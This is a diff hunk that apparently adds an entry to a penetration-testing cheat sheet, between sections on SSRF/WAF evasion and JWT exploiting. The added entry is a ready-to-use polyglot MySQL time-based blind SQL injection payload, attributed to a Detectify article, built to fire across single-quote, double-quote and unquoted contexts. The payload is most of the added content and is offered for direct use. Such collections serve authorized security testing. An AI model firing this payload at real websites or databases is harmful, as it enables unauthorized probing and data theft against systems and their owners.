@@ -1591,6 +1591,17 @@ SSRF
 WAF evasion if any.
 ```
 
+
+#### Ultimate MySQL Injection Payload (Detetify)
+
+```sql
+#https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
+
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+
+
+```
+
 #### JWT Exploiting
 
 ```powershell
